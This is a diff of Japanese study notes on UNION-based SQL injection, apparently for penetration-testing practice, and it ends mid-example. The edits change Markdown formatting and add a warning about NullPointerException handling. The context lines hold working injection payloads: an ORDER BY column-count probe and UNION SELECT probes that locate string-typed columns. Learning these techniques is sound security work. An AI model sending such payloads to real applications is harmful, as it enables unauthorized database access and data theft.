@@ -85,7 +85,7 @@ $
 ```sql
 ' ORDER BY hogefoo -- //
 ```
-→レスポンスの`Unknown column`を検索し、あればUNION SQLiが可能
+- →レスポンスの`Unknown column`を検索し、あればUNION SQLiが可能
 
 2. エラーが発生するまでカラムインデックスをインクリメントする（エラーが発生する*直前*の値が実際のカラム数）
 ```sql
@@ -106,7 +106,7 @@ $
 
 
 > [!WARNING] 
->
+> *NullPointerException*（NULL値が指定されたとき例外処理が稼働）：これがあると、NULL値の数が一致してもしなくても同じレスポンスが返ってくるのでこの方法は不可能
 
 #### ステップ2：データ型が文字列型であるカラムを割り出す
 
@@ -122,7 +122,7 @@ $
 ' UNION SELECT NULL,NULL,'a',NULL -- //
 ' UNION SELECT NULL,NULL,NULL,'a' -- //
 ```
-あるカラムが文字列型だとわかったら、値を残したまま検証する
+- あるカラムが文字列型だとわかったら、値を残したまま検証する
 
 ```sql
 ' UNION SELECT NULL,'a','a',NULL-- 
